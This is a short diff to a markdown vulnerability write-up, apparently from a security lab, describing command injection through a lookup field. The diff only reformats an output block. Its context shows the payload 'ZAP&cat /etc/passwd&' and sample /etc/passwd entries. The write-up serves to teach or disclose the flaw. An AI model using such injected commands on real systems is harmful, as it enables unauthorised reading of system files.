@@ -34,8 +34,10 @@ Steps taken to exploit the vulnerability:
 * Type ```ZAP&cat /etc/passwd&``` in the input field and hit Lookup button.
 * You will see a list of  all the necessary details about every account in the Linux system like following:
 
-```root:x:0:0:root:/root:/bin/bash```
-```daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin```
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+```
 
 Screenshots:
 ![](/pics/vul2_site.png)
